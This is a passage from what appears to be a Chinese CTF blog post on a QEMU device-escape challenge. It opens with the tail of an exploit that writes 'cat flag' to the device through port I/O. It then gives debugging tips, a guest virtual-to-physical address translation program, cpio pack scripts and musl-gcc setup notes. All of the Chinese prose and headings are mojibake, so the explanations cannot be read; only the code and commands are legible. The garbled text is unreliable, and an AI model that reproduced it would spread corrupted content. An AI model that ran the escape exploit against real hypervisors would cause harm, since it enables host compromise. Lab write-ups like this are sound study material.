class="comment">// flag</span></span><br><span class="line">    pmio_write(<span class="number">0x1C</span>, <span class="number">0x20746163</span>);  <span class="comment">// cat</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821302.png" alt="image-20230316162420666" style="zoom: 67%;" />



<h2 id="å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½"><a href="#å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½" class="headerlink" title="å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½"></a>å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½</h2><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>æ‰§è¡Œ <code>launch.sh</code> è„šæœ¬ï¼Œå°† <code>qemu</code> å¯åŠ¨èµ·æ¥ï¼Œç„¶åç”¨ <code>ps -a | grep qemu</code> æ¥æŸ¥çœ‹ <code>qemu</code> çš„è¿›ç¨‹å·ï¼Œæ¥ç€ <code>sudo gdb qemu-system-x86_64</code>  æ¥å¼€ <code>gdb</code> ï¼Œå†è¾“å…¥ <code>attach pid</code>  é™„åŠ è¿›ç¨‹å¼€å§‹è°ƒè¯•ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261609688.png" alt="image-20230226160922771"></p>
<p>å‡è®¾æˆ‘ä»¬ç°åœ¨æƒ³ä» <code>qemu-system</code> ä¸­çš„ <code>vn_mmio_read</code> å‡½æ•°è¿™é‡Œå¼€å§‹è°ƒè¯•ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸‹è¯¥å‡½æ•°çš„æ–­ç‚¹ï¼ˆæœ¬é¢˜çš„ <code>qemu-system</code> å¹¶æ²¡æœ‰å¼€ <code>PIE</code> ï¼Œæ‰€ä»¥ç›´æ¥ä¸‹æ–­ç‚¹å³å¯ï¼Œå¦‚æœå¼€ <code>PIE</code> çš„è¯åˆ«å¿˜è®°åŠ åŸºåœ°å€ï¼‰ï¼Œå¹¶åœ¨ <code>qemu</code> ä¸­è¿è¡Œ <code>exp</code> ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œä»è€Œæ¥è°ƒè¯•æŸ¥çœ‹æˆ‘ä»¬å…³æ³¨çš„ä¿¡æ¯</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261610355.png" alt="image-20230226161041668"></p>
<h3 id="qemuä¸­çš„è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜"><a href="#qemuä¸­çš„è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜" class="headerlink" title="qemuä¸­çš„è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜"></a>qemuä¸­çš„è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜</h3><p>åœ¨è¿™ä¹‹å‰è¦å…ˆæ˜ç™½ä¸¤ç‚¹ï¼Œç¬¬ä¸€ç‚¹æ˜¯å®¢æˆ·æœº æŒ‡çš„æ˜¯è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸­çš„æ“ä½œç³»ç»ŸåŠå…¶åº”ç”¨ç¨‹åºã€‚è€Œå®¿ä¸»æœº åˆ™æŒ‡çš„æ˜¯è¿è¡Œè™šæ‹Ÿæœºçš„ç‰©ç†æœº ã€‚ç¬¬äºŒï¼Œ<code>qemu</code> è·‘åœ¨å®¿ä¸»æœºé‡Œï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼Œå’Œå…¶ä»–è¿›ç¨‹æ²¡æœ‰ä»»ä½•åŒºåˆ«</p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥æœ‰å››ä¸ªåœ°å€ï¼Œåˆ†åˆ«æ˜¯ å®¢æˆ·æœºçš„ç‰©ç†åœ°å€ï¼Œå®¢æˆ·æœºçš„è™šæ‹Ÿåœ°å€ï¼Œå®¿ä¸»æœºçš„ç‰©ç†åœ°å€ï¼Œå®¿ä¸»æœºçš„è™šæ‹Ÿåœ°å€</p>
<ul>
<li><p>å®¿ä¸»æœºçš„ç‰©ç†åœ°å€ï¼šæŒ‡çš„æ˜¯ç‰©ç†å†…å­˜æ¡ä¸Šçš„åœ°å€ï¼Œå³ç¡¬ä»¶ç›´æ¥è®¿é—®çš„ç‰©ç†åœ°å€ã€‚</p>
</li>
<li><p>å®¿ä¸»æœºçš„è™šæ‹Ÿåœ°å€ï¼šæ“ä½œç³»ç»Ÿæ‰€å‘ˆç°ç»™æˆ‘ä»¬çš„è™šå‡åœ°å€ï¼Œå®ƒä»¬è¢«ç”¨æ¥è®¿é—®å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹</p>
</li>
<li><p>å®¢æˆ·æœºçš„ç‰©ç†åœ°å€ï¼šç”± <code>qemu</code> ç¨‹åºæ‰§è¡Œäº† <code>mmap</code> å‡½æ•°ï¼Œæ˜ å°„äº†ä¸€ç‰‡å†…å­˜ç©ºé—´å‡ºæ¥ï¼Œä½œä¸ºå®¢æˆ·æœºçš„ç‰©ç†åœ°å€</p>
</li>
<li><p>å®¢æˆ·æœºçš„è™šæ‹Ÿåœ°å€ï¼šå®¢æˆ·æœºé‡Œçš„æ“ä½œç³»ç»Ÿå°†åˆšåˆšæ˜ å°„å‡ºæ¥çš„é‚£ç‰‡å†…å­˜ç©ºé—´ç»è¿‡è½¬æ¢ï¼Œå‘ˆç°ç»™æˆ‘ä»¬äº†ä¸€ä¸ªè™šå‡åœ°å€</p>
</li>
</ul>
<p>æ­¤æ—¶å¦‚æœå†å»ä»”ç»†åˆ†æä¸‹é¢è¿™ä¸ªå›¾ ï¼ˆæ¥è‡ª <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-265501.htm">https://bbs.kanxue.com/thread-265501.htm</a> ï¼‰  çš„è¯ï¼Œå°±å¤§æ¦‚èƒ½ä½“ä¼šåˆ°è¿™äº›åœ°å€ç›´æ¥çš„å…³ç³»äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                       Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+                                    ï¼ˆGVAï¼‰</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |            ï¼ˆGPAï¼‰</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |         ï¼ˆHVAï¼‰</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||    ï¼ˆHPAï¼‰</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure>



<h4 id="è™šæ‹Ÿåœ°å€è½¬æ¢ç‰©ç†åœ°å€çš„è¿‡ç¨‹"><a href="#è™šæ‹Ÿåœ°å€è½¬æ¢ç‰©ç†åœ°å€çš„è¿‡ç¨‹" class="headerlink" title="è™šæ‹Ÿåœ°å€è½¬æ¢ç‰©ç†åœ°å€çš„è¿‡ç¨‹"></a>è™šæ‹Ÿåœ°å€è½¬æ¢ç‰©ç†åœ°å€çš„è¿‡ç¨‹</h4><p>ç„¶åç®€å•è¯´ä¸€ä¸‹å°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€çš„æ€è·¯</p>
<p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„é¡µè¡¨ï¼ˆå­˜å‚¨åœ¨ <code>/proc/self/pagemap</code> æ–‡ä»¶ä¸­ï¼‰ï¼Œé¡µè¡¨ç”±ä¸€ä¸ªæˆ–å¤šä¸ªé¡µè¡¨é¡¹ç»„æˆï¼Œæ¯ä¸ªé¡µè¡¨é¡¹è®°å½•äº†ä¸€ä¸ªè™šæ‹Ÿé¡µåˆ°ç‰©ç†é¡µçš„æ˜ å°„å…³ç³»ï¼Œåœ¨ <code>64</code> ä½ <code>Linux</code> ç³»ç»Ÿä¸­ï¼Œé¡µè¡¨é¡¹ä¸º <code>64</code> ä½ã€‚</p>
<p>ç°åœ¨ç»™å‡ºä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œå°†å…¶å³ç§» <code>9</code> ä½çš„è¯ï¼Œå¾—åˆ°çš„æ˜¯é¡µè¡¨é¡¹åç§»é‡ï¼ˆé¡µè¡¨é¡¹åœ¨é¡µè¡¨ä¸­çš„åç§»ï¼‰,è¿™é‡Œ <code>&amp; ~7</code> æ˜¯å°†é¡µè¡¨é¡¹åç§»é‡å‘ä¸‹å¯¹é½åˆ°8å­—èŠ‚è¾¹ç•Œä¸Šï¼ˆå› ä¸ºé¡µè¡¨é¡¹æ˜¯å…«å­—èŠ‚ï¼Œè¿™é‡Œæ˜¯è¦å…«å­—èŠ‚å¯¹é½ï¼‰</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">offset = (addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span></span><br></pre></td></tr></table></figure>



<p>å¾—åˆ°é¡µè¡¨é¡¹åç§»é‡ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å»ç”¨ <code>lseek</code> å’Œ <code>read</code> å‡½æ•°ä» <code>pagemap</code> æ–‡ä»¶ä¸­è¯»å–ä¸€ä¸ªé¡µè¡¨é¡¹çš„ä¿¡æ¯ï¼Œè¯»å–å‡ºæ¥çš„ä¿¡æ¯åŒ…æ‹¬ï¼š</p>
<ul>
<li><p>bit 0-54 å­˜å‚¨ç‰©ç†é¡µå¸§å·</p>
</li>
<li><p>bit 55-62 ä¸ºä¿ç•™ä½</p>
</li>
<li><p>bit 63 å­˜å‚¨é¡µé¢æ˜¯å¦å­˜åœ¨</p>
<p>å¦‚æœå­˜å‚¨é¡µé¢å­˜åœ¨çš„è¯ï¼Œé‚£æˆ‘ä»¬å°±è¯»å–å®ƒçš„ç‰©ç†é¡µå¸§å·ï¼Œæœ€ç»ˆè¦è·å–ç‰©ç†çš„åœ°å€çš„è¯ï¼Œéœ€è¦ç‰©ç†é¡µå¸§å·å’Œé¡µé¢å†…åç§»é‡ï¼ˆè™šæ‹Ÿåœ°å€å°†å…¶å³ç§» <code>12</code> ä½ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬æœ€åçš„ç‰©ç†åœ°å€æ˜¯å°†ç‰©ç†é¡µå¸§å·å·¦ç§» <code>12</code> ä½ï¼Œå°†å…¶æˆ–ï¼ˆ <code>|</code> ï¼‰ä¸Šé¡µé¢å†…åç§»é‡ï¼Œå³å¯å¾—åˆ°ç‰©ç†åœ°å€ã€‚</p>
</li>
</ul>
<h4 id="ç¨‹åºéªŒè¯"><a href="#ç¨‹åºéªŒè¯" class="headerlink" title="ç¨‹åºéªŒè¯"></a>ç¨‹åºéªŒè¯</h4><p>ç”¨ç½‘ä¸Šå…¶ä»–å¸ˆå‚…çš„ä¸€ä¸ªç¨‹åºæ¥éªŒè¯ä¸€ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="comment">// è·å–é¡µå†…åç§»</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// addr &amp; 0xfff</span></span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pfn_item_offset : %p\n&quot;</span>, (<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>);</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;<span class="comment">//å¾—åˆ°çš„æ˜¯é¡µè¡¨é¡¹åç§»é‡</span></span><br><span class="line"> </span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);<span class="comment">//è¯»å–ä¸€ä¸ªé¡µè¡¨é¡¹çš„ä¿¡æ¯</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))<span class="comment">// ç¡®ä¿é¡µé¢å­˜åœ¨â€”â€”page is present.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// physical frame number</span></span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;<span class="comment">//è¿”å›ç‰©ç†é¡µå¸§å·</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);<span class="comment">//é€šè¿‡ç‰©ç†é¡µå¸§å·å’Œé¡µå†…åç§»é‡æ¥å¾—åˆ°ç‰©ç†åœ°å€</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *ptr;</span><br><span class="line">    <span class="type">uint64_t</span> ptr_mem;</span><br><span class="line"> </span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual address %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"> </span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°†å…¶ç¼–è¯‘åæ”¾å…¥ <code>qemu</code> ä¸­ï¼Œè°ƒè¯•ä¸€ä¸‹ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303051312873.png" alt="image-20230305131217704"></p>
<p>å› ä¸ºå¯ <code>qemu</code> çš„æ—¶å€™ï¼Œç»™çš„æ˜¯ <code>64M</code> çš„å†…å­˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å»æ‰¾è¿™ä¸ª <code>0x4000000</code>  çš„èµ·å§‹å†…å­˜åœ°å€ï¼Œå‘ç°æ˜¯ <code>0x7fc254c00000</code> ï¼Œç„¶åç”¨è¿™ä¸ªåœ°å€åŠ ä¸Šç‰©ç†å†…å­˜ï¼Œå°±èƒ½æ‰¾åˆ°å­—ç¬¦ä¸² <code>Where am I?</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303051350957.png" alt="image-20230305135007883"></p>
<p>å¦‚æœæˆ‘ä»¬å¸Œæœ›æœ¬åœ°è°ƒè¯•è„šæœ¬ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯éœ€è¦å°† <code>exp</code> æ–‡ä»¶æ”¾å…¥åˆ° <code>qemu</code> ä¸­çš„ï¼Œè¿™é‡Œçš„é€šç”¨æ–¹æ³•æ˜¯æœ¬åœ°å…ˆå°†æ–‡ä»¶ç³»ç»Ÿè§£åŒ…ï¼Œç„¶åæŠŠ <code>exp.c</code> æ”¾è¿›å»ï¼Œå†æ‰“åŒ…å³å¯ï¼Œå…·ä½“æ–¹æ³•å¦‚ä¸‹</p>
<h3 id="è§£åŒ…å’Œæ‰“åŒ…è„šæœ¬"><a href="#è§£åŒ…å’Œæ‰“åŒ…è„šæœ¬" class="headerlink" title="è§£åŒ…å’Œæ‰“åŒ…è„šæœ¬"></a>è§£åŒ…å’Œæ‰“åŒ…è„šæœ¬</h3><h4 id="å¯¹-cpio-æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…"><a href="#å¯¹-cpio-æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…" class="headerlink" title="å¯¹ cpio æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…"></a>å¯¹ <code>cpio</code> æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…</h4><p>è§£åŒ…è„šæœ¬ï¼ˆå¦‚æœç¼ºå°‘ <code>unar</code> çš„è¯ï¼Œè¯·è‡ªè¡Œå®‰è£…ï¼‰ è½¬è‡ª <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f08e34cf08ad">https://www.jianshu.com/p/f08e34cf08ad</a>  å¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">mv $1 $1.gz</span><br><span class="line">unar $1.gz</span><br><span class="line">mv $1 core</span><br><span class="line">mv $1.gz $1</span><br><span class="line">echo &quot;[+]Successful&quot;</span><br></pre></td></tr></table></figure>

<p>æ‰“åŒ…è„šæœ¬</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; $1 </span><br><span class="line">mv $1 ..</span><br></pre></td></tr></table></figure>

<p>å°†è¿™ä¸¤ä¸ªè„šæœ¬éƒ½æ”¾ç½®åˆ° <code>/usr/local/bin</code> ç›®å½•ä¸‹ï¼Œå°†è§£åŒ…è„šæœ¬å‘½åä¸º <code>hen</code>  æ‰“åŒ…è„šæœ¬å‘½åä¸º <code>gen</code></p>
<p><strong>æœ€ååˆ«å¿˜è®°ç»™å®ƒä»¬å¯æ‰§è¡Œæƒé™</strong></p>
<h5 id="ä½¿ç”¨æ–¹æ³•ï¼š"><a href="#ä½¿ç”¨æ–¹æ³•ï¼š" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ï¼š"></a>ä½¿ç”¨æ–¹æ³•ï¼š</h5><p>ä½¿ç”¨ <code>hen rootfs.cpio</code> å‘½ä»¤ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ª <code>core</code> æ–‡ä»¶å¤¹ï¼Œç„¶å <code>cd core</code> ï¼Œå°†å‡†å¤‡ç¼–è¯‘å¥½çš„ <code>exp</code> æ–‡ä»¶å¤åˆ¶è¿›æ¥ã€‚ç„¶ååœ¨ <code>core</code> ç›®å½•æ‰§è¡Œ <code>gen rootfs.cpio</code> å‘½ä»¤å³å¯ï¼ˆæ³¨æ„ï¼Œè§£åŒ…å‘½ä»¤æ˜¯åœ¨ <code>core</code> æ–‡ä»¶çš„ä¸Šä¸€çº§ä½¿ç”¨çš„ï¼Œæ‰“åŒ…å‘½ä»¤æ˜¯åœ¨ <code>core</code> æ–‡ä»¶ä¸­ä½¿ç”¨çš„ï¼‰</p>
<p>æœ€åé‡æ–°è¿è¡Œ <code>launch.sh</code> ï¼Œè¿›å…¥åˆ° <code>qemu</code> ä¸­åï¼Œå°±å¯ä»¥çœ‹åˆ° <code>exp</code> æ–‡ä»¶äº†ã€‚</p>
<h4 id="å¯¹-img-æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…"><a href="#å¯¹-img-æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…" class="headerlink" title="å¯¹ img æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…"></a>å¯¹ <code>img</code> æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…</h4><p>å¦‚æœæ˜¯ <code>rootfs.img</code> æ–‡ä»¶çš„è¯ï¼Œå°±åˆ›å»ºä¸€ä¸ª <code>rootfs</code> æ–‡ä»¶å¤¹ï¼Œç„¶åå°† <code>rootfs.img</code> æ–‡ä»¶å¤åˆ¶è¿›å»ï¼Œæ‰§è¡Œå‘½ä»¤ <code>cpio -ivmd &lt; rootfs.img </code> ï¼Œè§£åŒ…åï¼Œå°† <code>exp</code> å¤åˆ¶åˆ° <code>rootfs</code> æ–‡ä»¶å¤¹ä¸­ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤ï¼ˆåœ¨ <code>rootfs</code> æ–‡ä»¶ä¸­æ‰§è¡Œï¼‰ <code>find . | cpio -o -H newc | gzip -9  &gt; ../rootfs.img </code> å³å¯å°† <code>exp</code> æ‰“åŒ…è¿›å»ã€‚</p>
<h3 id="musl-gcc-çš„ç¼–è¯‘ä¸ç¯å¢ƒå˜é‡çš„é…ç½®"><a href="#musl-gcc-çš„ç¼–è¯‘ä¸ç¯å¢ƒå˜é‡çš„é…ç½®" class="headerlink" title="musl-gcc çš„ç¼–è¯‘ä¸ç¯å¢ƒå˜é‡çš„é…ç½®"></a>musl-gcc çš„ç¼–è¯‘ä¸ç¯å¢ƒå˜é‡çš„é…ç½®</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.musl-libc.org/releases/musl-latest.tar.gz</span><br><span class="line">tar zxvf musl-latest.tar.gz</span><br></pre></td></tr></table></figure>

<p>ç„¶å <code>cd</code> è¿›å…¥è§£å‹ä¹‹åçš„ç›®å½•ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„å‘½ä»¤æ‰§è¡Œçš„æƒé™</p>
<p>æ¥ä¸‹æ¥ï¼Œå¦‚æœä½ èƒ½ç”¨ç»å¯¹è·¯å¾„æ¥æ‰§è¡Œ <code>musl-gcc</code> é‚£å°±è¯´æ˜å®‰è£…çš„æ²¡é—®é¢˜ï¼Œç„¶åæ¥é…ç½®ç¯å¢ƒå˜é‡</p>
<p>å¦‚æœä½ å’Œæˆ‘ä¸€æ ·ä½¿ç”¨çš„æ˜¯ <code>zsh shell</code> ï¼ˆåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ <code>echo $0</code> å¯ä»¥è¿›è¡Œç¡®è®¤ï¼‰ï¼Œé‚£ä¹ˆåº”è¯¥å°†ç¯å¢ƒå˜é‡è®¾ç½®æ·»åŠ åˆ° <code>~/.zshrc</code> æ–‡ä»¶ä¸­</p>
<p>å°†ä¸‹é¢çš„å‘½ä»¤æ·»åŠ åˆ° <code>~/.zshrc</code> æ–‡ä»¶çš„æœ«å°¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ -d &quot;/usr/local/musl/bin&quot; ] ; then</span><br><span class="line">    PATH=&quot;/usr/local/musl/bin:$PATH&quot;</span><br><span class="line">fi</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œé‡æ–°åŠ è½½ <code>.zshrc</code> æ–‡ä»¶å³å¯ï¼ˆæ­¤æ—¶è¾“å…¥ <code>musl-gcc</code> å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure>



<h4 id="ç¼ºå°‘åº“-æŠ¥é”™è§£å†³"><a href="#ç¼ºå°‘åº“-æŠ¥é”™è§£å†³" class="headerlink" title="ç¼ºå°‘åº“ æŠ¥é”™è§£å†³"></a>ç¼ºå°‘åº“ æŠ¥é”™è§£å†³</h4><p>æœ€å¼€å§‹åœ¨ <code>ubuntu 18.04</code> ä¸Šè¿è¡Œå‘ç°ç¼ºå°‘åº“ï¼Œç„¶å <code>ldd</code> çœ‹äº†ä¸€ä¸‹ï¼ˆæƒ…å†µå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821585.png" alt="image-20230313230807235"></p>
<p>è¿™åº”è¯¥æ˜¯ <code>libc</code> ç‰ˆæœ¬å¤ªä½å¯¼è‡´çš„ï¼Œäºæ˜¯æˆ‘å°±æ”¹ç”¨äº† <code>22.04</code> </p>
<p>æ­¤æ—¶çš„æŠ¥é”™å¦‚ä¸‹</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821453.png" alt="image-20230313231108491"></p>
<p>ç„¶å <code>winmt</code> å¸ˆå‚…æ•™æˆ‘çš„è§£å†³æ€è·¯æ˜¯ <code>apt search xxx</code> æ¥æœç´¢ç¼ºå°‘çš„åº“ï¼Œ <code>xxx</code> åˆ™æ˜¯ <code>so</code> å‰é¢çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ <code>libbrlapi</code>ï¼ˆæ•ˆæœå¦‚ä¸‹ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161822783.png" alt="image-20230313231250902" style="zoom: 67%;" />



<p>ç„¶åæˆ‘æ˜¯æŠŠè¿™å‡ ä¸ªåº“å…¨ç»™å®‰è£…äº† ï¼Œå‘½ä»¤æ˜¯ <code>sudo apt install xxx</code></p>
<p>ä¸è¿‡å‘ç°ä¾ç„¶æ˜¯è¿™ä¸ªæŠ¥é”™ï¼Œäºæ˜¯æ‰§è¡Œå‘½ä»¤ <code>find /usr/lib -name &quot;libbrlapi*&quot;</code> æ•ˆæœå¦‚ä¸‹</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161822719.png" alt="image-20230313231502355" style="zoom:67%;" />

<p>å¯ä»¥å‘ç°ï¼Œç°åœ¨çš„ <code>/usr/lib</code> ç›®å½•ä¸‹æ˜¯å®‰è£…äº† <code>/usr/lib/x86_64-linux-gnu/libbrlapi.so.0.8</code> ï¼Œä½†æ˜¯è¿™ä¸ª <code>qemu-system-x86_64</code> éœ€è¦çš„æ˜¯ <code>libbrlapi.so.0.7</code> ï¼Œäºæ˜¯æŒ‰ç…§ <code>winmt</code> å¸ˆå‚…æ‰€è¯´ï¼Œåˆ›å»ºäº†ä¸€ä¸ªåå­—å«åš <code>libbrlapi.so.0.7</code> çš„è½¯é“¾æ¥ï¼Œå‘½ä»¤æ˜¯ <code>sudo ln -s libbrlapi.so.0.8 libbrlapi.so.0.7</code> ï¼Œæœ€ç»ˆé—®é¢˜è§£å†³ï¼Œå¯ä»¥æˆåŠŸå¯åŠ¨ <code>qemu</code>ã€‚</p>
